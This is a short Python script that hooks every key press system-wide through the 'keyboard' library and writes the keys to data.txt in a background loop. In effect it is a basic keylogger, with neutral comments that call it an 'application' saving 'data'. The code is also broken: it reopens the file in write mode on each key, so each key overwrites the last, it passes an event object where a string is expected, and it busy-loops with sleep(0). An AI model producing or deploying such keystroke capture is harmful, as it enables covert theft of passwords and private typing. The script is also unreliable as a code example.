import time
import keyboard

# define a function to save the data
def save_data(data):
    # open the file in write mode
    with open("data.txt", "w") as file:
        # write the data to the file
        file.write(data)

# define a function to handle key press events
def on_key_press(key):
    # save the key to the file
    save_data(key)

# define a function to run the application
def run_application():
    # register the key press event callback
    keyboard.on_press(on_key_press)

    # run the application in the background
    while True:
        time.sleep(0)

# start the application
run_application()
